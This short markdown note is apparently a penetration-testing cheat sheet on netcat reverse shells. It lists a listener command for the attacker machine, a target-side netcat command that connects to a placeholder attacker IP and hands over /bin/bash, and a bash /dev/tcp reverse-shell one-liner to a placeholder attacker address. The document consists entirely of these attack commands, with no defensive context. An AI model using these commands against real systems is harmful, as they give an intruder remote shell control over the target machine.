# Net cat
### On Attacker machine
```
nc -lvnp port_no
```

### On Target machine
```
nc Attacker_IP port_no -e /bin/bash
```

#### payload 
```bash -i >& /dev/tcp/ATTACKER_IP/ port_no 0>&1```
